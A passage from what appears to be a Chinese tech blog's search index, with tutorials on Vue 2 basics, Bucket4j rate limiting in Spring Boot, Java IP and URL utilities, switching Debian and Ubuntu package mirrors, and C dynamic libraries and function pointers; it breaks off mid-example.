\'https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.esm.browser.js\'&lt;/script&gt; NPM 方式安装NPM 安装步骤初始化 NodeJs 项目，会自动生成 package.json 和 package-lock.json 文件 1$ npm install -y 给 NodeJs 项目安装 Vue，安装完成后项目下会多出 node_modules 目录 12345# 安装最新版本（适用于开发环境）$ npm install vue# 安装指定版本（适用于生产环境）$ npm install vue@2.7.10 不同构建版本的说明在 NPM 包的 dist 目录你将会找到很多不同的 Vue.js 构建版本。这里列出了它们之间的差别： UMD CommonJS ES Module (基于构建工具使用) ES Module (直接用于浏览器) 完整版 vue.js vue.common.js vue.esm.js vue.esm.browser.js 只包含运行时版 vue.runtime.js vue.runtime.common.js vue.runtime.esm.js - 完整版 (生产环境) vue.min.js - - vue.esm.browser.min.js 只包含运行时版 (生产环境) vue.runtime.min.js - - - 完整版：同时包含编译器和运行时的版本。 编译器：用来将模板字符串编译成为 JavaScript 渲染函数的代码。 运行时：用来创建 Vue 实例、渲染并处理虚拟 DOM 等的代码。基本上就是除去编译器的其它一切。 UMD：UMD 版本可以通过 &lt;script&gt; 标签直接用在浏览器中。CDN 的 https://cdn.jsdelivr.net/npm/vue@2.7.10 默认文件就是运行时 + 编译器的 UMD 版本 (vue.js)。 CommonJS：CommonJS 版本用来配合老的打包工具比如 Browserify 或 Webpack 1。这些打包工具的默认文件 (pkg.main) 是只包含运行时的 CommonJS 版本 (vue.runtime.common.js)。 ES Module：从 2.6 开始 Vue 会提供两个 ES Modules (ESM) 构建文件： 为打包工具提供的 ESM：为诸如 Webpack 2 或 Rollup 提供的现代打包工具。ESM 格式被设计为可以被静态分析，所以打包工具可以利用这一点来进行 tree-shaking 并将用不到的代码排除出最终的包。为这些打包工具提供的默认文件 (pkg.module) 是只有运行时的 ES Module 构建 (vue.runtime.esm.js)。 为浏览器提供的 ESM (2.6+)：用于在现代浏览器中通过 &lt;script type="module"&gt; 直接导入。 Vue 快速入门Vue 简单使用说明 使用 Vue 实例管理 DOM DOM 与数据 / 事件等进行相关绑定 开发者只需要关注数据、事件等处理，无需关心视图如何进行更新 声明式渲染123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Vue&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;h1&gt; Hello {{name}} &lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { name: "Jack" } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 首先通过 new Vue() 来创建 Vue 实例 然后 Vue 的构造函数接收一个对象，对象中有一些属性 el：是 element 的缩写，通过 id 选中要渲染的页面标签，在本案例里选中了一个 DIV 标签 data：数据，数据是一个对象，里面有很多自定义的属性，都可以渲染到视图中 name：指定了一个 name 属性 最后在页面的 h1 标签中，通过 {{name}} 的方式，来渲染刚刚定义的 name 属性 代码运行效果 使用 Vue 的声明式渲染，上述 HTML 代码运行后的效果如下，打开浏览器的 JavaScript 控制台，通过执行 app.name=\'Peter\' 来改变模型，将看到视图会相应地更新 单向绑定单向绑定，也就是模型变化会引起视图变化（渲染），但是反过来就不行。 v-bind 指令使用 v-bind 指令绑定 HTML 标签的 attribute（属性） 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;span v-bind:title="message"&gt; 鼠标悬停几秒钟，查看此处动态绑定的提示信息！ &lt;/span&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: \'#app\', data: { message: \'页面加载于 \' + new Date().toLocaleString() } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 双向绑定双向绑定，也就是模型变化会引起视图变化（渲染），反之亦然。 v-model 指令使用 v-model 指令进行双向绑定 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;label&gt;Please input a number: &lt;/label&gt;&lt;input type="text" v-model="number" &gt; &lt;h1&gt; Hello {{name}}, you {{number}} have books&lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { name: "Jack", number: "1" } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 使用 v-model 指令进行双向绑定，上述 HTML 代码运行后的效果如下，页面上显示的数字会随输入框的内容一起变化 事件绑定v-on 指令使用 v-on 指令绑定点击事件 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="number++"&gt;Add Books&lt;/button&gt; &lt;h1&gt; Hello {{name}}, you have {{number}} books&lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { name: "Jack", number: "1" } }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 或者在 Vue 实例中定义方法 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;button v-on:click="add"&gt;Add Books&lt;/button&gt; &lt;h1&gt; Hello {{name}}, you have {{number}} books&lt;/h1&gt; &lt;/div&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.7.10/dist/vue.js"&gt;&lt;/script&gt; &lt;script&gt; let app = new Vue({ el: "#app", data: { name: "Jack", number: "1" }, methods: { add () { this.number++; } }, }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码运行效果 使用 Vue 的点击事件绑定，上述 HTML 代码运行后的效果如下，点击按钮后，页面上显示的数字会递增 Vue 开发工具VSCode 插件 Vetur - Vue 语法高亮、智能感知、Emmet 等 Vue 3 Snippets - Vue2、Vue3 代码片段快速生成 Chrome 浏览器调试插件应用商店安装访问 Chrome 应用商店（依赖科学上网），然后在搜索框搜索 Vue Devtools，最后直接点击插件进行安装即可。 源码编译安装1234567891011# 下载源码$ git clone https://github.com/vuejs/vue-devtools# 进入源码目录$ cd vue-devtools# 安装依赖$ npm install# 编译打包$ npm run build 编译打包成功后会在 shells 下生成 chrome 文件夹，此文件夹就是用来存放编译打包生成的 Chrome 扩展程序。 打开 Chrome 浏览器 &gt; 更多工具 &gt; 扩展程序 &gt; 打开开发者模式，点击加载已解压的扩展程序，找到刚才生成的 chrome 文件夹，选择 vue-devtools &gt; shells &gt; chrome 放入，安装成功后的截图如下： 插件使用说明Chrome 浏览器打开 Vue 项目的页面后，按下快捷键 F12，点击选择 vue 标签页就可以开始使用插件了 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Bucket4j 限流入门教程之一",url:"/posts/2885bf23.html",text:'前言限流概述在开发高并发系统时可以用三把利器来保护系统：缓存、降级和限流。缓存的目的是提升系统访问速度和增大系统处理的容量，是抗高并发流量的 “银弹”；而降级是当服务出现问题或者影响到核心流程时，需要暂时将其屏蔽掉，待高峰过去之后或者问题解决后再打开；而有些场景并不能用缓存和降级来解决，比如稀缺资源（秒杀、抢购）、写服务（如评论、下单）、频繁的复杂查询等，因此需要有一种手段来限制这些场景的并发 / 请求量，即限流。限流的目的是通过对并发访问 / 请求进行限速或者对一个时间窗口内的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务（定向到错误页或友好的展示页）、排队或等待（比如秒杀、评论、下单等场景）、降级（返回兜底数据或默认数据）。主流的中间件都会有单机限流框架，一般支持两种限流模式：控制速率和控制并发。Spring Cloud Zuul 通过第三方扩展 spring-cloud-zuul-ratelimit 也可以支持限流，而 Spring Cloud Gateway 的限流实现可以看这里。常见的限流算法有漏桶和令牌桶，计数器也可以进行粗暴限流实现。对于限流算法，可以参考 Guava 中的 RateLimiter、Bucket4j、RateLimitJ 等项目的具体实现。 Bucket4j 介绍Bucket4j 是基于令牌桶算法的 Java 限流库，它主要用在 3 种场景： 限制比较重工作的速率 限制对 API 的访问速率 将限流作为定时器，例如有些场景限制你对服务提供方的调用速度，因此使用限流器作为定时器，定时按照约定速率调用服务提供方 Spring Boot 整合 Bucket4j本案例主要是简单演示如何在单机 Spring Boot 应用中使用 Bucket4j，使用的缓存组件是 Caffeine（JCache API），点击下载完整的案例代码。特别注意，在企业开发中，若 Spring Boot 应用是以集群的方式部署，则必须采用分布式缓存方案，具体的参考方案如下： Back-end Documentation page Async supported Optimized serialization Thin-client support Hazelcast bucket4j-hazelcast Yes Yes Planned Apache Ignite bucket4j-ignite Yes n/a Yes Inifinispan bucket4j-infinspan Yes Yes No Oracle Coherence bucket4j-coherence Yes Yes No 代码示例添加 Bucket4j + Spring Boot Starter + Caffeine 相关的 Maven 依赖 123456789101112131415161718192021222324252627282930313233343536373839&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.7.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.giffing.bucket4j.spring.boot.starter&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;caffeine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;jcache&lt;/artifactId&gt; &lt;version&gt;2.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.cache&lt;/groupId&gt; &lt;artifactId&gt;cache-api&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建缓存配置类，并添加 @EnableCaching 注解来启用缓存功能 12345@EnableCaching@Configurationpublic class Bucket4jCacheConfig {} 创建 Controller 类 123456789101112131415161718import org.springframework.http.ResponseEntity;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class TestController { @GetMapping("hello") public ResponseEntity&lt;String&gt; hello() { return ResponseEntity.ok("Hello World"); } @GetMapping("world") public ResponseEntity&lt;String&gt; world() { return ResponseEntity.ok("Hello World"); }} 创建主启动类 12345678@SpringBootApplicationpublic class Bucket4jApplication { public static void main(String[] args) { SpringApplication.run(Bucket4jApplication.class, args); }} 创建 application.yml 主配置文件 12345678910111213141516171819202122server: port: 8080spring: application: name: bucket4j-spring-boot-caffeine cache: cache-names: - buckets caffeine: spec: maximumSize=1000000,expireAfterAccess=3600s # 设置了名为buckets的缓存，过期时间为1h，容量为1000000bucket4j: enabled: true filters: - cache-name: buckets url: .* rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds # 设置的rate-limits每10秒2个token Bucket4j 配置参数说明如下： bucket4j.enabled=true：启用 Bucket4j 的自动配置 bucket4j.filters.cache-name：从缓存中获取 API 密钥的 Bucket bucket4j.filters.url：表示应用速率限制的路径表达式，.* 表示拦截所有 URL bucket4j.filters.rate-limits.bandwidths：定义 Bucket4j 速率限制参数 代码测试正常请求接口的时候，服务端响应的结果如下： 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 200&lt; X-Rate-Limit-Remaining: 1Hello World 当频繁请求接口的时候，服务端会返回 429 的 HTTP 状态码和 JSON 数据 { "message": "Too many requests!" }，如下所示： 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 429&lt; X-Rate-Limit-Retry-After-Seconds: 2{ "message": "Too many requests!" } 自定义限流响应结果当触发限流条件时，Bucket4j 默认会返回 429 的 HTTP 状态码，同时返回 JSON 数据 { "message": "Too many requests!" } 给客户端。若需要自定义返回的数据内容，可以配置 http-response-body 参数，如下所示： 1234567891011bucket4j: enabled: true filters: - cache-name: buckets url: .* http-response-body: \'{"code":429,"data":"","msg":"Too many requests!"}\' rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds 参考博客 Rate Limiting a Spring API Using Bucket4j var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 java"},{title:"Java 开发常用代码块之一",url:"/posts/677dbf04.html",text:'网络编程获取 IP 地址12345678910111213141516171819202122232425262728293031323334353637383940import cn.hutool.core.util.StrUtil;import javax.servlet.http.HttpServletRequest;/** * IP地址工具 */public class IPUtils { /** * 获取IP地址 * 如果使用Nginx等反向代理软件，不能通过request.getRemoteAddr()获取IP地址 * 如果使用了多级反向代理的话，X-Forwarded-For的值并不止一个，而是一串IP地址，X-Forwarded-For中第一个非unknown的有效IP字符串，则为真实IP地址 */ public static String getIpAddr(HttpServletRequest request) { String ip = null; try { ip = request.getHeader("x-forwarded-for"); if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("WL-Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_CLIENT_IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_X_FORWARDED_FOR"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getRemoteAddr(); } } catch (Exception e) { System.out.println("IPUtils ERROR " + e.getLocalizedMessage()); } return ip; }} 正则表达式解析 URL通过正则表达式，获取 URL 中的协议、域名、端口、URI。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import cn.hutool.core.util.StrUtil;import java.util.HashMap;import java.util.Map;import java.util.regex.Matcher;import java.util.regex.Pattern;public class HttpUtil { public static final String HTTP_PROTOCOL = "http://"; public static final String HTTPS_PROTOCOL = "https://"; /** * 解析URL（包括协议、域名、端口、URI） * * @param url * @return */ public static Map&lt;String, String&gt; parseUrl(String url) { Map&lt;String, String&gt; map = new HashMap(4); try { Pattern pattern = Pattern.compile("(https?://)([^:^/]*)(:\\\\d*)?(.*)?"); Matcher matcher = pattern.matcher(url); boolean findResult = matcher.find(); if (!findResult) { return map; } String protocol = matcher.group(1); String domain = matcher.group(2); String port = matcher.group(3); String uri = matcher.group(4); if (StrUtil.isBlank(port)) { if (HTTP_PROTOCOL.equals(protocol)) { port = "80"; } else if (HTTPS_PROTOCOL.equals(protocol)) { port = "443"; } else { port = "unknown"; } } else { port = port.replace(":", ""); } map.put("protocol", protocol); map.put("domain", domain); map.put("port", port); map.put("uri", uri); } catch (Exception e) { e.printStackTrace(); } return map; }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 代码块"},{title:"Debian 更换软件源",url:"/posts/f7ed6378.html",text:'Ubuntu 20.4 LTS 更换软件源 更换阿里云软件源 12345678# 备份配置文件# cp /etc/apt/sources.list /etc/apt/sources.list.bak# 清空配置文件内容# echo "" &gt; /etc/apt/sources.list# 编辑配置文件，添加以下内容# vi /etc/apt/sources.list 12345678910deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse 使阿里云软件源生效 12# 更新软件索引# apt-get update Debian 9（Stretch）更换软件源 更换阿里云软件源 12345678# 备份配置文件# cp /etc/apt/sources.list /etc/apt/backup.sources.list# 清空配置文件内容# echo "" &gt; /etc/apt/sources.list# 编辑配置文件，添加以下内容# vi /etc/apt/sources.list 12345678deb http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb http://mirrors.aliyun.com/debian-security stretch/updates maindeb-src http://mirrors.aliyun.com/debian-security stretch/updates maindeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib 使阿里云软件源生效（必须） 12# 更新软件索引# apt-get update 更新软件和系统（非必须，请谨慎操作） 12345# 升级系统里的所有软件# apt-get upgrade# 升级系统版本# apt-get dist-upgrade 若是构建 Docker 镜像，那么在 Dockerfile 里可以使用以下指令 12345678910111213RUN cp /etc/apt/sources.list /etc/apt/backup.sources.list &amp;&amp; echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update \\ &amp;&amp; apt-get -y upgrade \\ &amp;&amp; apt-get -y autoclean &amp;&amp; apt-get -y autoremove Debian 11（Bullseye）更换软件源 更换 163 软件源 12345678# 备份配置文件# cp /etc/apt/sources.list /etc/apt/backup.sources.list# 清空配置文件内容# echo "" &gt; /etc/apt/sources.list# 编辑配置文件，添加以下内容# vi /etc/apt/sources.list 12345678deb http://mirrors.163.com/debian/ bullseye main non-free contribdeb http://mirrors.163.com/debian/ bullseye-updates main non-free contribdeb http://mirrors.163.com/debian/ bullseye-backports main non-free contribdeb-src http://mirrors.163.com/debian/ bullseye main non-free contribdeb-src http://mirrors.163.com/debian/ bullseye-updates main non-free contribdeb-src http://mirrors.163.com/debian/ bullseye-backports main non-free contribdeb http://mirrors.ustc.edu.cn/debian-security/ stable-security main non-free contribdeb-src http://mirrors.ustc.edu.cn/debian-security/ stable-security main non-free contrib 使 163 软件源生效（必须） 12# 更新软件索引# apt-get update 更新软件和系统（非必须，请谨慎操作） 12345# 升级系统里的所有软件# apt-get upgrade# 升级系统版本# apt-get dist-upgrade 若是构建 Docker 镜像，那么在 Dockerfile 里可以使用以下指令 12345678910111213RUN cp /etc/apt/sources.list /etc/apt/sources.list.bak \\ &amp;&amp; echo "deb http://mirrors.163.com/debian/ bullseye main non-free contrib" &gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.163.com/debian/ bullseye-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.163.com/debian/ bullseye-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ bullseye main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ bullseye-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.163.com/debian/ bullseye-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb http://mirrors.ustc.edu.cn/debian-security/ stable-security main non-free contrib" &gt;&gt; /etc/apt/sources.list \\ &amp;&amp; echo "deb-src http://mirrors.ustc.edu.cn/debian-security/ stable-security main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update \\ &amp;&amp; apt-get -y upgrade \\ &amp;&amp; apt-get -y autoclean &amp;&amp; apt-get -y autoremove var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"debian"},{title:"C 语言开发常用代码块之一",url:"/posts/3b2974c1.html",text:'加载动态库加载动态链接库（.dll）下述示例代码，适用于 Windows 系统的 C 语言开发。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() { HINSTANCE hInstance; // 加载动态链接库 hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 定义函数类型指针 typedef int (*CltSocketInit)(void** handle); // 调用动态链接库 CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if (cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // 释放动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言 代码块"},{title:"C 语言面向接口编程和多态",url:"/posts/1844a1fe.html",text:'数组指针数组类型的语法C 语言中的数组有自己特定的类型，可以通过 typedef 关键字定义数组类型，语法格式为：typedef type(name)[length];，例如： typedef int(MyIntArray)[3]; typedef char(MyCharArray)[3]; 数组指针类型的语法 数组指针类型用于指向一个数组 可以直接定义数组指针类型：typedef type(*name)[length]; 数组类型与数组指针类型的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;int main() { // 1. 定义数组类型（会分配内存空间） typedef int(MyArray)[3]; MyArray array; array[0] = 1; array[1] = 2; array[2] = 3; for (int i = 0; i &lt; 3; i++) { printf("array[%d] = %d\\n", i, array[i]); } printf("\\n"); // 2. 定义数组指针类型（不会分配内存空间） typedef int(*MyPointArray)[3]; int a[3]; MyPointArray pointArray; pointArray = &amp;a; // 将数组指针类型指向一个数组 (*pointArray)[0] = 11; (*pointArray)[1] = 22; (*pointArray)[2] = 33; for (int j = 0; j &lt; 3; j++) { printf("a[%d] = %d, ", j, a[j]); printf("(*pointArray)[%d] = %d\\n", j, (*pointArray)[j]); } printf("\\n"); // 3. 定义一个数组指针变量（不会分配内存空间） int(*pointArrayVar)[3]; int b[3]; pointArrayVar = &amp;b; // 将数组指针变量指向一个数组 (*pointArrayVar)[0] = 111; (*pointArrayVar)[1] = 222; (*pointArrayVar)[2] = 333; for (int n = 0; n &lt; 3; n++) { printf("b[%d] = %d, ", n, b[n]); printf("(*pointArrayVar)[%d] = %d\\n", n, (*pointArrayVar)[n]); }} 程序运行的输出结果如下： 1234567891011array[0] = 1array[1] = 2array[2] = 3a[0] = 11, (*pointArray)[0] = 11a[1] = 22, (*pointArray)[1] = 22a[2] = 33, (*pointArray)[2] = 33b[0] = 111, (*pointArrayVar)[0] = 111b[1] = 222, (*pointArrayVar)[1] = 222b[2] = 333, (*pointArrayVar)[2] = 333 函数指针函数类型的语法C 语言中的函数有自己特定的类型，可以通过 typedef 关键字定义函数类型，语法格式为：typedef type (name)(parameter list);，例如： typedef int (f)(int, int); typedef void (p)(int); 函数指针类型的语法 函数指针类型用于指向一个函数 函数有三大要素：名称、参数、返回值，函数名是函数体的入口地址 可以通过函数类型定义函数指针类型: FuncType* pointer; 也可以直接定义函数指针类型：typedef type (*pointer)(parameter list); pointer：函数指针变量名 type：指向函数的返回值类型 parameter list：指向函数的参数类型列表 函数类型与函数指针类型的使用12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int main() { // 1. 定义函数类型 typedef int (MyFuncType)(int a, int b); // 通过函数类型定义函数指针类型 MyFuncType* myFuncType = add; int result = myFuncType(1, 3); printf("%d + %d = %d\\n", 1, 3, result); // 2. 定义一个函数指针类型（不会分配内存空间） typedef int (*MyFuncPointType)(int a, int b); // 加不加上"&amp;"符号都是可以的，如果加上了"&amp;"符号，可以解决C语言版本的兼容问题 // MyFuncPointType myFuncPointType = &amp;add; MyFuncPointType myFuncPointType = add; int result2 = myFuncPointType(4, 5); printf("%d + %d = %d\\n", 4, 5, result2); // 3. 